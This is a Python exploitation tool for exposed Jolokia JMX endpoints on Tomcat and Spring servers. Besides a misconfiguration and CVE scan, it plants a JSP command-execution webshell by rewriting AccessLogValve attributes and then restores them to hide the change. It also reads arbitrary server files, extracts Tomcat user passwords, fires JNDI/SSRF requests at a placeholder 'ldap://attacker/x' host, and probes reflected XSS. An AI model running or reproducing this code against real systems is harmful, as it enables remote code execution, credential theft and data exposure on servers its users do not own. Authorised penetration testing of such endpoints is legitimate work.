#!/usr/bin/env python3


import argparse
import random
import re
import sys
import time
import urllib.parse
import requests
import urllib3
from typing import Dict, List, Optional, Tuple

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_COL = {
    "red": "\033[31m",
    "green": "\033[32m",
    "yellow": "\033[33m",
    "cyan": "\033[36m",
    "reset": "\033[0m"
}
_USE_COLOR = sys.stderr.isatty() and sys.stdout.isatty() and sys.platform != "win32"

def color_text(s: str, col: str) -> str:
    return f"{_COL[col]}{s}{_COL['reset']}" if _USE_COLOR else s

def info(msg: str):    print(color_text("[*] " + msg, "cyan"))
def success(msg: str): print(color_text("[+] " + msg, "green"))
def warning(msg: str): print(color_text("[!] " + msg, "yellow"))
def error(msg: str):   print(color_text("[-] " + msg, "red"), file=sys.stderr)
def debug(msg: str):   print(color_text("[DEBUG] " + msg, "reset"))
def header(msg: str):  print(color_text(f"\n=== {msg} ===", "cyan"))

# Proxy response classifiers
_PROXY_BLOCKED = re.compile(
    r'not allowed|whitelist|proxy.*disabled|disabled.*proxy'
    r'|No JSR-160 proxy|JSR-160.*not enabled|not enabled.*default',
    re.I
)
_PROXY_ENABLED = re.compile(r'java\.net|java\.rmi|java\.io\.|ServiceException|ConnectException', re.I)


class JolokiaExploiter:
    FORM_SHELL_PAYLOAD = """
<%@ page import="java.util.*,java.io.*" %><html><body>
<form method="post"><input name="cmd" placeholder="Command" autofocus>
<input type="submit" value="Run"></form><pre>
<% if("POST".equalsIgnoreCase(request.getMethod())) {
    String c=request.getParameter("cmd");
    if (c != null && !c.isEmpty()) {
        Process p = Runtime.getRuntime().exec(c);
        java.util.Scanner s = new java.util.Scanner(p.getInputStream())
                                    .useDelimiter("\\\\A");
        out.print(s.hasNext() ? s.next() : "");
    }
} %></pre></body></html>
"""

    # (min_version_inclusive, max_version_exclusive, cve, description)
    CVE_VERSION_MAP: List[Tuple] = [
        ((0, 0, 0), (1, 6, 0), "CVE-2018-1000129", "Reflected XSS in Jolokia error pages"),
        ((0, 0, 0), (1, 6, 0), "CVE-2018-1000130", "JNDI injection via proxy endpoint"),
        ((1, 7, 0), (1, 7, 2), "CVE-2022-41952",   "Proxy allowlist bypass / SSRF (1.7.x)"),
        ((2, 0, 0), (2, 0, 1), "CVE-2022-41952",   "Proxy allowlist bypass / SSRF (2.0.x)"),
    ]

    def __init__(self, url: str, user: str = None, password: str = None, debug_mode: bool = False):
        self.base_url = url.rstrip('/')
        if not self.base_url.endswith('/jolokia'):
            warning("URL might not be Jolokia endpoint")

        self.root_url = self.base_url.rsplit('/jolokia', 1)[0]
        self.session = requests.Session()
        self.session.verify = False
        self.debug_mode = debug_mode

        if user and password:
            self.session.auth = (user, password)

        self.cache: Dict = {}
        self.version_str: Optional[str] = None
        self.version: Optional[Tuple] = None
        self._version_response: Optional[requests.Response] = None
        self._detect_version()

    def _log(self, msg: str, level: str = "info"):
        if self.debug_mode or level != "debug":
            {"info": info, "debug": debug, "warning": warning, "error": error}.get(level, info)(msg)

    def _detect_version(self):
        try:
            response = self.session.get(f"{self.base_url}/version", timeout=5)
            if response.status_code == 200:
                self._version_response = response
                version = response.json().get('value', {}).get('agent')
                self.version_str = version
                if version:
                    m = re.match(r'(\d+)\.(\d+)\.(\d+)', version)
                    if m:
                        self.version = tuple(int(x) for x in m.groups())
                success(f"Jolokia version: {version}")
        except Exception as e:
            error(f"Version detection failed: {e}")

    def _request(self, path: str = "", data: dict = None) -> Optional[requests.Response]:
        url = f"{self.base_url}/{path.lstrip('/')}" if path else self.base_url
        try:
            if data:
                self._log(f"POST {url} - Data: {data}", "debug")
                response = self.session.post(url, json=data, timeout=15)
            else:
                self._log(f"GET {url}", "debug")
                response = self.session.get(url, timeout=15)
            if response:
                self._log(f"Response ({response.status_code}): {response.text[:200]}", "debug")
            return response
        except requests.RequestException as e:
            error(f"Request failed: {e}")
            return None

    def _load_cache(self):
        if self.cache:
            return
        response = self._request("list")
        if response and response.status_code == 200:
            self.cache = response.json().get('value', {})
        else:
            error("Failed to load MBean cache")

    def find_mbeans(self, pattern: str) -> List[str]:
        self._load_cache()
        regex = re.compile(pattern, re.IGNORECASE)
        return [
            f"{domain}:{bean}"
            for domain, beans in self.cache.items()
            for bean in beans
            if regex.search(bean) or regex.search(domain)
        ]

    # ── detection helpers ──────────────────────────────────────────────────

    def check_auth(self) -> bool:
        """Returns True when Jolokia responds without credentials."""
        r = self._request("version")
        if r and r.status_code == 200:
            try:
                return r.json().get('status') == 200
            except Exception:
                pass
        return False

    def check_cors(self) -> Optional[str]:
        """Returns the Access-Control-Allow-Origin value from the version response."""
        if not self._version_response:
            return None
        return self._version_response.headers.get("Access-Control-Allow-Origin") or None

    def _get_jolokia_config(self) -> Dict:
        """Returns the Jolokia config block from the version endpoint."""
        if not self._version_response:
            return {}
        try:
            return self._version_response.json().get('value', {}).get('config', {})
        except Exception:
            return {}

    def version_cves(self) -> List[Tuple[str, str]]:
        """Returns (cve, description) for all version-based known vulnerabilities."""
        if not self.version:
            return []
        return [
            (cve, desc)
            for min_v, max_v, cve, desc in self.CVE_VERSION_MAP
            if min_v <= self.version < max_v
        ]

    def check_proxy_enabled(self) -> Tuple[bool, list]:
        """Returns (unrestricted, whitelist) from the Jolokia config.

        unrestricted=True means the proxy is on with no whitelist restriction.
        Returns (False, ['disabled']) when the dispatcher explicitly disables proxy.
        """
        cfg = self._get_jolokia_config()
        # Jolokia 1.5.0+ ships with a dedicated "not enabled" dispatcher class
        dispatcher = cfg.get('dispatcherClasses', '')
        if 'NotEnabled' in dispatcher or 'NotEnabledByDefault' in dispatcher:
            return (False, ['disabled-by-dispatcher'])
        whitelist = cfg.get('proxyAllowedTargetHosts', cfg.get('proxyWhiteList', []))
        if whitelist is None:
            whitelist = []
        return (len(whitelist) == 0, whitelist)

    def test_proxy_ssrf(self, callback_url: str) -> bool:
        """Send a proxy-mode request and determine whether Jolokia attempted the connection.

        CVE-2018-1000130 / CVE-2022-41952: an unrestricted proxy can be used to
        reach internal JMX endpoints or trigger JNDI lookups.
        """
        payload = {
            "type": "read",
            "mbean": "java.lang:type=Runtime",
            "attribute": "VmName",
            "target": {"url": callback_url}
        }
        r = self._request("", data=payload)
        if not r:
            return False
        try:
            body = r.json()
            err = str(body.get('error', ''))
            if _PROXY_BLOCKED.search(err):
                return False
            if _PROXY_ENABLED.search(err) or body.get('status') == 200:
                return True
        except Exception:
            pass
        return False

    def check_jmxconfigurator(self) -> Optional[str]:
        """Returns the JMXConfigurator MBean name if Logback is present.

        An exposed JMXConfigurator allows reloadByURL, which can trigger
        JNDI lookups on vulnerable JDK versions (Logback CVE-2021-42550 vector).
        """
        mbeans = self.find_mbeans("JMXConfigurator")
        return mbeans[0] if mbeans else None

    def trigger_jmxconfigurator(self, mbean: str, jndi_url: str) -> bool:
        """Invoke JMXConfigurator.reloadByURL with a caller-supplied URL."""
        payload = {
            "type": "exec",
            "mbean": mbean,
            "operation": "reloadByURL",
            "arguments": [jndi_url]
        }
        r = self._request("", data=payload)
        if r:
            info(f"Server response: {r.text[:400]}")
            return r.status_code == 200
        return False

    def get_thread_dump(self) -> Optional[str]:
        """Get a JVM thread dump via DiagnosticCommand, falling back to Threading MBean."""
        mbeans = self.find_mbeans("DiagnosticCommand")
        if mbeans:
            # threadPrint takes a String[] — pass an empty array
            r = self._request("", data={
                "type": "exec",
                "mbean": mbeans[0],
                "operation": "threadPrint",
                "arguments": [[]]
            })
            if r and r.status_code == 200:
                val = str(r.json().get('value', ''))
                if val and 'Could not' not in val and val != 'None':
                    return val
        # Fallback: dumpAllThreads(lockedMonitors, lockedSynchronizers)
        r = self._request("", data={
            "type": "exec",
            "mbean": "java.lang:type=Threading",
            "operation": "dumpAllThreads",
            "arguments": [True, True]
        })
        if r and r.status_code == 200:
            val = r.json().get('value')
            if val:
                return str(val)
        return None

    def get_system_properties(self) -> Optional[Dict]:
        """Dump all JVM system properties via the Runtime MBean."""
        r = self._request("read/java.lang:type=Runtime/SystemProperties")
        if r and r.status_code == 200:
            props = r.json().get('value', {})
            if props:
                return props
        return None

    # ── scan ───────────────────────────────────────────────────────────────

    def check_vulnerabilities(self):
        """Comprehensive Jolokia misconfiguration and CVE detection scan."""
        self._load_cache()

        header("Authentication")
        if self.check_auth():
            warning("Unauthenticated access confirmed")
        else:
            success("Authentication appears to be required")

        header("Version Analysis")
        proxy_unrestricted, proxy_whitelist = self.check_proxy_enabled()
        if self.version_str:
            info(f"Version: {self.version_str}")
            vulns = self.version_cves()
            for cve, desc in vulns:
                if cve == "CVE-2018-1000130" and not proxy_unrestricted:
                    info(f"{cve}: proxy disabled at runtime — not exploitable here")
                    continue
                if cve == "CVE-2018-1000129":
                    r = self._request("version?mimeType=text%2Fhtml")
                    if r and "text/html" not in r.headers.get("Content-Type", "").lower():
                        info(f"{cve}: mimeType=text/html has no effect on Content-Type here — unconfirmed (run 'xss' to probe further)")
                        continue
                warning(f"{cve}: {desc}")
            if not vulns:
                success("No known version-based CVEs for this release")
        else:
            warning("Version detection failed — manual verification required")

        header("CORS Policy")
        cors_hdr = self.check_cors()
        config_cors = self._get_jolokia_config().get('allowedOrigin', '')
        if cors_hdr == '*' or config_cors == '*':
            warning("CORS wildcard detected (Access-Control-Allow-Origin: *)")
        elif cors_hdr:
            info(f"Access-Control-Allow-Origin: {cors_hdr}")
        else:
            success("No permissive CORS header")

        header("Proxy Endpoint  [CVE-2018-1000130 / CVE-2022-41952]")
        if proxy_unrestricted:
            warning("Proxy whitelist is empty — SSRF/JNDI via proxy is possible")
            info("Confirm with: milky.py <url> proxy -u 'service:jmx:rmi:///jndi/ldap://attacker/x'")
        elif 'disabled' in str(proxy_whitelist):
            success("Proxy disabled via dispatcher — not exploitable")
        else:
            success(f"Proxy restricted to: {proxy_whitelist}")

        header("JMXConfigurator / Logback JNDI")
        jmx_conf = self.check_jmxconfigurator()
        if jmx_conf:
            warning(f"JMXConfigurator available: {jmx_conf}")
            warning("reloadByURL may allow JNDI injection on vulnerable JDKs")
            info("Exploit with: milky.py <url> jndi -u ldap://attacker/x")
        else:
            success("JMXConfigurator not found")

        header("Dangerous MBeans")
        critical_mbeans = [
            ("AccessLogValve",    "RCE via log poisoning",                    "CRITICAL"),
            ("DiagnosticCommand", "Arbitrary file read + heap/thread dump",    "HIGH"),
            ("UserDatabase",      None,                                        "HIGH"),
            ("JMXConfigurator",   "JNDI injection vector (Logback)",           "HIGH"),
            ("HotSpotDiagnostic", "Heap dump generation (sensitive data)",     "MEDIUM"),
            ("EnvironmentManager","Spring property read/write",                "MEDIUM"),
        ]
        found = False
        for pattern, desc, severity in critical_mbeans:
            mbeans = self.find_mbeans(pattern)
            if not mbeans:
                continue
            found = True
            # UserDatabase: only count MBeans that actually expose a 'users' attribute
            if pattern == "UserDatabase":
                mbeans = [
                    db for db in mbeans
                    if 'users' in self.cache
                        .get(db.split(':')[0], {})
                        .get(db.split(':', 1)[1], {})
                        .get('attr', {})
                ]
                if not mbeans:
                    continue
                user_count = 0
                for db in mbeans:
                    r = self._request(f"read/{db}/users")
                    if r and r.status_code == 200:
                        users = r.json().get('value', [])
                        user_count += len(users) if isinstance(users, (list, dict)) else (1 if users else 0)
                if user_count > 0:
                    desc = f"Tomcat credential leakage ({user_count} user(s) readable)"
                else:
                    desc = "UserDatabase exposed but no users configured (check manually)"
                    severity = "LOW"
            warning(f"[{severity}] {pattern} — {desc}")
            for m in mbeans[:3]:
                print(f"  - {m}")
        if not found:
            success("No critical MBeans found")

        header("Reflected XSS  [CVE-2018-1000129]")
        info("Run 'milky.py <url> xss' for a live probe")

    # ── original exploitation methods ──────────────────────────────────────

    def read_file(self, file_path: str) -> Optional[str]:
        if file_path.startswith("/"):
            encoded_path = "!/" + file_path.lstrip("/").replace("/", "!/")
        else:
            encoded_path = file_path.replace("/", "!/")
        response = self._request(f"exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/{encoded_path}")
        if response and response.status_code == 200:
            raw = response.json().get("value", "")
            if raw.startswith("Could not load file"):
                error(raw.strip())
                return None
            content = re.sub(r"Parsing of compiler directives failed.*", "", raw, flags=re.DOTALL)
            m = re.search(r"\n\s*At '[^']*'\.\s*\n", content)
            if m:
                content = content[m.end():]
            content = content.strip()
            if not content:
                error("Empty response")
                return None
            success(f"Successfully read {file_path}")
            info(f"{len(content.splitlines())} lines extracted")
            return content
        error(f"Failed to read {file_path}")
        return None

    def _get_property_via_spring(self, mbean: str, property_name: str) -> Optional[str]:
        request = {
            "type": "exec",
            "mbean": mbean,
            "operation": "getProperty",
            "arguments": [property_name]
        }
        r = self._request(data=request)
        if r and r.status_code == 200:
            value = r.json().get("value")
            if value:
                success(f"Got {property_name} via Spring: {value}")
                return value
        error(f"Failed to get {property_name} via Spring")
        return None

    def _get_property_via_jmx(self, mbean: str, property_name: str) -> Optional[str]:
        request = {
            "type": "read",
            "mbean": mbean,
            "attribute": "SystemProperties",
            "path": property_name
        }
        r = self._request(data=request)
        if r and r.status_code == 200:
            value = r.json().get("value")
            if value:
                success(f"Got {property_name} via JMX: {value}")
                return value
        error(f"Failed to get {property_name} via JMX")
        return None

    def _discover_webroot_from_config(self) -> Optional[str]:
        info("Trying to discover webroot from server.xml")
        config_paths = ["/conf/server.xml", "conf/server.xml", "../conf/server.xml",
                        "/etc/tomcat/server.xml", "/usr/local/tomcat/conf/server.xml"]
        for path in config_paths:
            content = self.read_file(path)
            if not content:
                continue
            m = re.search(r'<Host\s+[^>]*appBase="([^"]+)"', content)
            if m:
                app_base = m.group(1)
                success(f"Found appBase in server.xml: {app_base}")
                if app_base.startswith("$CATALINA_BASE"):
                    base = self._get_property_via_jmx("java.lang:type=System", "catalina.base")
                    if base:
                        app_base = app_base.replace("$CATALINA_BASE", base)
                elif app_base.startswith("$CATALINA_HOME"):
                    home = self._get_property_via_jmx("java.lang:type=System", "catalina.home")
                    if home:
                        app_base = app_base.replace("$CATALINA_HOME", home)
                if "ROOT" not in app_base:
                    app_base = f"{app_base}/ROOT"
                return app_base
        error("Failed to discover webroot from configuration")
        return None

    def get_catalina_base(self) -> Optional[str]:
        env_mbean = next(iter(self.find_mbeans("EnvironmentManager")), None)
        if env_mbean:
            catalina_base = self._get_property_via_spring(env_mbean, "catalina.base")
            if catalina_base:
                return catalina_base
        catalina_base = self._get_property_via_jmx("java.lang:type=Runtime", "catalina.base")
        if catalina_base:
            return catalina_base
        catalina_base = self._get_property_via_jmx("java.lang:type=System", "catalina.base")
        if catalina_base:
            return catalina_base
        for prop in ["catalina.home", "user.dir"]:
            val = self._get_property_via_jmx("java.lang:type=System", prop)
            if val:
                return val
        return self._discover_webroot_from_config()

    def deploy_shell(self) -> Optional[str]:
        valve = next(iter(self.find_mbeans(r'AccessLogValve')), None)
        if not valve:
            error("AccessLogValve not found")
            return None
        success(f"AccessLogValve: {valve}")
        base = self.get_catalina_base()
        if base:
            target_dir = f"{base}/webapps/ROOT"
            success(f"Using directory: {target_dir}")
        else:
            target_dir = "webapps/ROOT"
            warning("Using default directory: webapps/ROOT")
        r = self._request("", data={"type": "read", "mbean": valve})
        if not r or r.status_code != 200:
            error("Cannot read valve attributes")
            return None
        backup = r.json().get("value", {})
        info("Backed up valve attributes")
        prefix = str(random.randint(1000, 9999))
        file_date = f"_{random.randint(1000, 9999)}"
        tweaks = {
            "pattern": " ",
            "checkExists": "true",
            "fileDateFormat": file_date,
            "prefix": prefix,
            "suffix": ".jsp",
            "directory": target_dir,
            "buffered": "false",
            "asyncSupported": "false",
        }
        info("Configuring valve attributes")
        for attr, value in tweaks.items():
            self._request("", data={
                "type": "write",
                "mbean": valve,
                "attribute": attr,
                "value": value
            })
        info("Sleeping 10s for valve reload")
        time.sleep(10)
        payload = self.FORM_SHELL_PAYLOAD.replace('%', '%{%}t')
        info("Writing shell payload to pattern attribute")
        self._request("", data={
            "type": "write",
            "mbean": valve,
            "attribute": "pattern",
            "value": payload
        })
        info("Triggering request to create shell file")
        self._request("version")
        info("Resetting pattern attribute")
        self._request("", data={
            "type": "write",
            "mbean": valve,
            "attribute": "pattern",
            "value": " "
        })
        info("Sleeping 5s for log flush")
        time.sleep(5)
        restore_order = [k for k in backup.keys() if k != "pattern"]
        info("Restoring original valve attributes")
        for k in restore_order:
            self._request("", data={
                "type": "write",
                "mbean": valve,
                "attribute": k,
                "value": backup[k]
            })
        shell_path = f"/{prefix}{file_date}.jsp"
        shell_url = f"{self.root_url}{shell_path}"
        info(f"Verifying shell at: {shell_url}")
        try:
            response = self.session.get(shell_url, timeout=10, verify=False)
            if response.status_code == 200:
                if "form method" in response.text:
                    success("Webshell deployed successfully!")
                    success(f"URL: {shell_url}")
                    success(f"Usage: curl -X POST {shell_url} -d 'cmd=whoami'")
                    return shell_url
                else:
                    error("Webshell deployed but payload not found in response")
            else:
                error(f"Unexpected HTTP status: {response.status_code}")
        except Exception as e:
            error(f"Verification failed: {e}")
        error("Webshell deployment failed")
        return None

    def get_credentials(self) -> Dict[str, str]:
        info("Enumerating UserDatabase MBeans")
        credentials = {}
        user_dbs = self.find_mbeans("UserDatabase")
        if not user_dbs:
            warning("No UserDatabase MBeans found")
            return credentials
        for db in user_dbs:
            info(f"Querying users from {db}")
            response = self._request(f"read/{db}/users")
            if not response or response.status_code != 200:
                error(f"Failed to read users from {db}")
                continue
            users = response.json().get('value', '')
            for user_entry in str(users).split(','):
                if match := re.search(r'username="([^"]+)"', user_entry):
                    username = match.group(1)
                    pass_response = self._request(
                        f"read/Users:database=UserDatabase,type=User,username=\"{username}\"/password"
                    )
                    if pass_response and pass_response.status_code == 200:
                        password = pass_response.json().get('value', '')
                        credentials[username] = password
                        success(f"Found credential for {username}")
        if credentials:
            success(f"Extracted {len(credentials)} credential(s)")
        else:
            warning("No credentials extracted")
        return credentials

    def manage_spring_property(self, action: str, key: str, value: str = None) -> Optional[str]:
        env_mbean = next(iter(self.find_mbeans("EnvironmentManager")), None)
        if not env_mbean:
            error("EnvironmentManager MBean not found")
            return None
        if action == "get":
            response = self._request(f"read/{env_mbean}/property/{key}")
            if response and response.status_code == 200:
                return response.json().get('value')
            return None
        elif action == "set" and value:
            response = self._request(data={
                "type": "write",
                "mbean": env_mbean,
                "attribute": key,
                "value": value
            })
            if response and response.status_code == 200:
                return value
        return None

    def check_xss(self) -> bool:
        """Probe CVE-2018-1000129 via two vectors:
        1. mimeType=text/html path reflection  (classic PoC)
        2. JSONP ?callback= reflection with text/javascript CT (JSONP hijack)
        """
        marker = ''.join(random.choices('0123456789abcdef', k=8))
        info(f"Testing XSS (CVE-2018-1000129) with marker {marker}")

        # Vector 1: path reflection + mimeType=text/html
        inj_raw = f"<svg onload=alert({marker})>"
        inj_enc = urllib.parse.quote(inj_raw, safe='')
        r1 = self._request(f"read{inj_enc}?mimeType=text/html")
        if r1:
            ct1 = r1.headers.get("Content-Type", "")
            if "text/html" in ct1.lower() and marker in r1.text:
                success("Reflected XSS via mimeType=text/html (CVE-2018-1000129)")
                return True

        # Vector 2: JSONP callback reflection — ?callback=<name>&mimeType=text/html
        cb_name = f"milky_{marker}"
        r2 = self._request(f"version?callback={cb_name}&mimeType=text%2Fhtml")
        if r2:
            ct2 = r2.headers.get("Content-Type", "")
            nosniff = "nosniff" in r2.headers.get("X-Content-Type-Options", "").lower()
            reflected = cb_name in r2.text
            if "text/html" in ct2.lower() and reflected:
                success("Reflected XSS confirmed: mimeType=text/html + content reflected (CVE-2018-1000129)")
                return True
            if "text/javascript" in ct2.lower() and reflected:
                # JSONP callback reflected as text/javascript — hijack risk, not XSS.
                # Modern browsers enforce Content-Type and won't treat JS as HTML.
                if nosniff:
                    info("JSONP callback reflected but X-Content-Type-Options: nosniff present")
                    info("Not exploitable as XSS — JSONP hijack risk only if sensitive data returned")
                else:
                    warning("JSONP callback reflected as text/javascript (no X-Content-Type-Options)")
                    warning("JSONP hijack risk — not direct XSS (Content-Type is not text/html)")
                return False

        error("CVE-2018-1000129 not confirmed on this deployment")
        return False


def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  Full misconfiguration scan:
    milky.py http://target:8080/jolokia scan

  Deploy webshell (AccessLogValve RCE):
    milky.py http://target:8080/jolokia deploy

  Read file via DiagnosticCommand:
    milky.py http://target:8080/jolokia read -f /etc/passwd

  Check reflected XSS (CVE-2018-1000129):
    milky.py http://target:8080/jolokia xss

  Test proxy SSRF / JNDI (CVE-2018-1000130, CVE-2022-41952):
    milky.py http://target:8080/jolokia proxy -u 'service:jmx:rmi:///jndi/ldap://attacker/x'

  Trigger JMXConfigurator reloadByURL (Logback JNDI):
    milky.py http://target:8080/jolokia jndi -u ldap://attacker/x

  Dump JVM thread dump:
    milky.py http://target:8080/jolokia dump

  Dump JVM system properties:
    milky.py http://target:8080/jolokia env

  Extract Tomcat credentials:
    milky.py http://target:8080/jolokia creds

  Manage Spring properties:
    milky.py http://target:8080/jolokia spring -a get -k server.port
    milky.py http://target:8080/jolokia spring -a set -k spring.datasource.url -v jdbc:h2:mem:test
"""
    )
    parser.add_argument("url", help="Jolokia endpoint URL")
    parser.add_argument("--user",     help="HTTP Basic Auth username")
    parser.add_argument("--password", help="HTTP Basic Auth password")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")

    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("scan",   help="Full misconfiguration + CVE scan")
    sub.add_parser("deploy", help="Deploy webshell via AccessLogValve")

    read_p = sub.add_parser("read", help="Read a remote file via DiagnosticCommand")
    read_p.add_argument("-f", "--file", required=True, help="Remote file path")

    sub.add_parser("creds", help="Dump Tomcat UserDatabase credentials")
    sub.add_parser("xss",   help="Probe reflected XSS (CVE-2018-1000129)")

    proxy_p = sub.add_parser("proxy", help="Test proxy SSRF/JNDI (CVE-2018-1000130 / CVE-2022-41952)")
    proxy_p.add_argument("-u", "--target", required=True,
                         help="Target URL for proxy request (e.g. service:jmx:rmi:///jndi/ldap://attacker/x)")

    jndi_p = sub.add_parser("jndi", help="Trigger JMXConfigurator.reloadByURL (Logback JNDI)")
    jndi_p.add_argument("-u", "--target", required=True, help="JNDI/HTTP URL to load (e.g. ldap://attacker/x)")

    sub.add_parser("dump", help="Retrieve JVM thread dump (info disclosure)")
    sub.add_parser("env",  help="Dump JVM system properties (info disclosure)")

    spring_p = sub.add_parser("spring", help="Read/write Spring EnvironmentManager properties")
    spring_p.add_argument("-a", "--action", choices=["get", "set"], required=True)
    spring_p.add_argument("-k", "--key",   required=True, help="Property key")
    spring_p.add_argument("-v", "--value", help="Property value (required for set)")

    args = parser.parse_args()

    try:
        j = JolokiaExploiter(args.url, args.user, args.password, debug_mode=args.debug)

        if args.command == "scan":
            j.check_vulnerabilities()

        elif args.command == "deploy":
            j.deploy_shell()

        elif args.command == "read":
            content = j.read_file(args.file)
            if content:
                print(content)
            else:
                error("File read failed")

        elif args.command == "creds":
            creds = j.get_credentials()
            if creds:
                for user, pwd in creds.items():
                    print(f"{user}:{pwd}")
            else:
                warning("No credentials found")

        elif args.command == "xss":
            j.check_xss()

        elif args.command == "proxy":
            info(f"Sending proxy request to: {args.target}")
            if j.test_proxy_ssrf(args.target):
                success("Proxy endpoint accepted the request — SSRF/JNDI is possible")
                success(f"Target URL attempted: {args.target}")
            else:
                proxy_unrestricted, whitelist = j.check_proxy_enabled()
                if not proxy_unrestricted and 'disabled' in str(whitelist):
                    success("Proxy is disabled by Jolokia dispatcher configuration")
                elif whitelist:
                    warning(f"Proxy is restricted to: {whitelist}")
                else:
                    error("Proxy request blocked or endpoint unreachable")

        elif args.command == "jndi":
            mbean = j.check_jmxconfigurator()
            if not mbean:
                error("JMXConfigurator MBean not found — Logback may not be present")
            else:
                success(f"Using MBean: {mbean}")
                if j.trigger_jmxconfigurator(mbean, args.target):
                    success(f"reloadByURL triggered with: {args.target}")
                else:
                    error("reloadByURL call failed")

        elif args.command == "dump":
            info("Requesting JVM thread dump")
            dump = j.get_thread_dump()
            if dump:
                success("Thread dump retrieved")
                print(dump)
            else:
                error("Thread dump failed — DiagnosticCommand may be unavailable")

        elif args.command == "env":
            info("Requesting JVM system properties")
            props = j.get_system_properties()
            if props:
                success(f"Retrieved {len(props)} system properties")
                for k, v in sorted(props.items()):
                    print(f"  {k} = {v}")
            else:
                error("System properties unavailable")

        elif args.command == "spring":
            if args.action == "get":
                value = j.manage_spring_property("get", args.key)
                if value is not None:
                    print(value)
                else:
                    error("Property not found")
            elif args.action == "set":
                if not args.value:
                    error("Value is required for set operation")
                    return
                if j.manage_spring_property("set", args.key, args.value) is not None:
                    success("Property set successfully")
                else:
                    error("Property set failed")

    except KeyboardInterrupt:
        error("\nOperation aborted")
    except Exception as e:
        error(f"Operation failed: {e}")


if __name__ == "__main__":
    main()
